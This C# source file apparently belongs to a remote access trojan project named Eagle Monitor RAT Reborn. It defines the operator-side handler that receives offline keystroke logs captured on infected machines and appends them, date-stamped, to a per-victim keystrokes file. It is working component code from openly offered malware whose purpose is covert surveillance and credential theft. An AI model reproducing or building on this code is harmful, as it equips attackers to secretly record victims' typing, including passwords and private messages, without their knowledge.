using Eagle_Monitor_RAT_Reborn.Misc;
using Eagle_Monitor_RAT_Reborn.Network;
using PacketLib.Packet;
using System.IO;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.PacketHandler
{
    internal class KeylogOfflinePacketHandler
    {
        public KeylogOfflinePacketHandler(KeylogOfflinePacket keylogOfflinePacket, ClientHandler clientHandler)
        {
            Directory.CreateDirectory(ClientHandler.ClientHandlersList[keylogOfflinePacket.baseIp].clientPath + "\\Keystrokes\\");
            File.AppendAllText(ClientHandler.ClientHandlersList[keylogOfflinePacket.baseIp].clientPath + "\\Keystrokes\\" + "Offlinekeystrokes.txt", keylogOfflinePacket.keyStroke + "\n--------------------------------------------\nDATE : " + Utils.DateFormater() + "\n--------------------------------------------\n");
        }
    }
}
